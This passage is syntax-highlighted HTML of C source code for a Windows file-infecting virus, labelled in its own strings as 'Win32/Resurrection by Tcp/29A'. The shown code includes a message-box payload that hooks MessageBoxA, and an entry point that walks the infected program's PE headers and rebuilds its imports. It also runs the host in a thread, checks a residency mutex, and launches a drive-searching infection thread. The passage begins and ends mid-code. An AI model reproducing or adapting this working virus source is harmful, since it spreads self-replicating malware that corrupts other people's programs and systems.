  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc2">///////////
// Payload
///////////
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">MyMessageBox</span><span class="sc10">(</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hWnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">Text</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">Caption</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">Type</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Msgs</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc6">"Hey you, stupid"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"Win32/Resurrection by Tcp/29A"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"Warning! Don't close this window"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"I already told you this but..."</span><span class="sc0">
  </span><span class="sc10">};</span><span class="sc0">
  </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">MessageBoxA</span><span class="sc10">(</span><span class="sc11">hWnd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Text</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Msgs</span><span class="sc10">[++</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">Type</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc2">// Simulated host for 1st generation
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Gen1</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">MyMessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc2">// Virus Entry Point
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">InfectedFile</span><span class="sc10">[</span><span class="sc11">_MAX_PATH</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">ThreadID</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">ThreadInfID</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">HThread</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">InfThread</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">HandleDLL</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ImportedDLLs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">


  </span><span class="sc2">// Get the infected filename
</span><span class="sc0">  </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">InfectedFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">InfectedFile</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc2">// And its memory address
</span><span class="sc0">  </span><span class="sc11">IDosHeader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_DOS_HEADER</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc11">InfectedFile</span><span class="sc10">);</span><span class="sc0">
   
  </span><span class="sc11">IPEHeader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_NT_HEADERS</span><span class="sc0"> </span><span class="sc10">*)((</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">IDosHeader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">IDosHeader</span><span class="sc10">-&gt;</span><span class="sc11">e_lfanew</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">Signature</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">IMAGE_NT_SIGNATURE</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">// Check if we got the PE header
</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">// Get ptr to Sections
</span><span class="sc0">    </span><span class="sc11">ISection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc10">*)((</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">IPEHeader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_NT_HEADERS</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc2">// Get ptr to virus Sections
</span><span class="sc0">    </span><span class="sc11">ISection</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">FirstVirusSection</span><span class="sc10">;</span><span class="sc0">
  
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Generation</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc2">// Make some easy 1st-gen calcs to avoid complex ones in next generations
</span><span class="sc0">      </span><span class="sc11">HostEP</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">Gen1</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">IDosHeader</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">VirusSections</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// Number of sections
</span><span class="sc0">      </span><span class="sc2">// Get the order of sections
</span><span class="sc0">      </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">VirusSections</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">AddressOfEntryPoint</span><span class="sc10">)</span><span class="sc0">
             </span><span class="sc10">&amp;&amp;</span><span class="sc0">
            </span><span class="sc10">(</span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">AddressOfEntryPoint</span><span class="sc10">)</span><span class="sc0">
           </span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">// This is the code section
</span><span class="sc0">          </span><span class="sc11">VirusCodeSection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">VirusEP</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">AddressOfEntryPoint</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">)</span><span class="sc0">
                      </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                    </span><span class="sc10">(</span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">)</span><span class="sc0">
                   </span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">// This is the import section
</span><span class="sc0">                </span><span class="sc11">VirusImportSection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
              </span><span class="sc11">VirusRVAImports</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc5">else</span><span class="sc0">
          </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">// This is the reloc section
</span><span class="sc0">              </span><span class="sc11">VirusRelocSection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
              </span><span class="sc11">VirusRelocSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">Misc</span><span class="sc10">.</span><span class="sc11">VirtualSize</span><span class="sc10">;</span><span class="sc0">
              </span><span class="sc11">VirusRelocSizeDir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="sc10">].</span><span class="sc11">Size</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc2">//for
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">  </span><span class="sc2">// Not first generation
</span><span class="sc0">    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">HostImports</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
      
      </span><span class="sc11">HostImports</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">HostRVAImports</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">IDosHeader</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc2">// Count imported DLLs
</span><span class="sc0">      </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HostImports</span><span class="sc10">-&gt;</span><span class="sc11">OriginalFirstThunk</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">ImportedDLLs</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc11">HostImports</span><span class="sc10">++;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc11">HandleDLL</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">MEMALLOC</span><span class="sc10">(</span><span class="sc11">ImportedDLLs</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">HMODULE</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc2">// Make host imports
</span><span class="sc0">      </span><span class="sc11">HostImports</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">HostRVAImports</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">IDosHeader</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">ImportedDLLs</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FunctionName</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FunctionAddr</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">LPCTSTR</span><span class="sc0"> </span><span class="sc11">Name</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">LPCTSTR</span><span class="sc0"> </span><span class="sc11">StExitThread</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"ExitThread"</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">HandleDLL</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">LoadLibrary</span><span class="sc10">((</span><span class="sc11">LPCTSTR</span><span class="sc10">)(</span><span class="sc11">HostImports</span><span class="sc10">-&gt;</span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">IDosHeader</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">// Exit if not find a DLL
</span><span class="sc0">          </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">StError</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">

          </span><span class="sc11">MEMFREE</span><span class="sc10">(</span><span class="sc11">HandleDLL</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">StError</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Can not find %s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPCTSTR</span><span class="sc10">)(</span><span class="sc11">HostImports</span><span class="sc10">-&gt;</span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">IDosHeader</span><span class="sc10">));</span><span class="sc0">
          </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">StError</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Error initializing program"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">MB_ICONWARNING</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">// Perform host imports
</span><span class="sc0">        </span><span class="sc11">FunctionName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">HostImports</span><span class="sc10">-&gt;</span><span class="sc11">OriginalFirstThunk</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">IDosHeader</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">FunctionAddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">HostImports</span><span class="sc10">-&gt;</span><span class="sc11">FirstThunk</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">IDosHeader</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">FunctionName</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">FunctionName</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">IMAGE_ORDINAL_FLAG</span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// Windows doesn't like ordinal imports from kernel32, so use my own GetProcAddress
</span><span class="sc0">            </span><span class="sc10">*</span><span class="sc11">FunctionAddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetProcAddressOrd</span><span class="sc10">((</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">HandleDLL</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">IMAGE_ORDINAL</span><span class="sc10">(*</span><span class="sc11">FunctionName</span><span class="sc10">));</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc5">else</span><span class="sc0">
          </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPCTSTR</span><span class="sc10">)((</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">IDosHeader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">FunctionName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc1">/*Hint*/</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">// Change ExitProcess by ExitThread
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">Name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ExitProcess"</span><span class="sc10">))</span><span class="sc0">
              </span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">StExitThread</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc2">// Set payload
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">Name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MessageBoxA"</span><span class="sc10">))</span><span class="sc0">
              </span><span class="sc10">*</span><span class="sc11">FunctionAddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)&amp;</span><span class="sc11">MyMessageBox</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
              </span><span class="sc10">*</span><span class="sc11">FunctionAddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">HandleDLL</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">Name</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc11">FunctionName</span><span class="sc10">++;</span><span class="sc0">
          </span><span class="sc11">FunctionAddr</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">HostImports</span><span class="sc10">++;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">HostEP</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">IDosHeader</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// Exec host with a thread
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">HThread</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPTHREAD_START_ROUTINE</span><span class="sc10">)</span><span class="sc11">HostEP</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GetCommandLine</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ThreadID</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">VirusMutex</span><span class="sc10">;</span><span class="sc0">
       
      </span><span class="sc2">// Check if already resident
</span><span class="sc0">      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">VirusMutex</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateMutex</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"29A"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
           </span><span class="sc10">&amp;&amp;</span><span class="sc0">
           </span><span class="sc10">(</span><span class="sc11">GetLastError</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ERROR_ALREADY_EXISTS</span><span class="sc10">)</span><span class="sc0">
         </span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">// Create infection thread
</span><span class="sc0">        </span><span class="sc11">InfThread</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPTHREAD_START_ROUTINE</span><span class="sc10">)</span><span class="sc11">SearchDrives</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_SUSPENDED</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ThreadInfID</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">// Assign a low priority
</span><span class="sc0">        </span><span class="sc11">SetThreadPriority</span><span class="sc10">(</span><span class="sc11">InfThread</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">THREAD_PRIORITY_IDLE</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">// Activate it
</span><span class="sc0">        </span><span class="sc11">ResumeThread</span><span class="sc10">(</span><span class="sc11">InfThread</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">// Wait until infection completed
</span><span class="sc0">        </span><span class="sc11">WaitForSingleObject</span><span class="sc10">(</span><span class="sc11">InfThread</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">INFINITE</span><span class="sc10">);</span><span class="sc0">
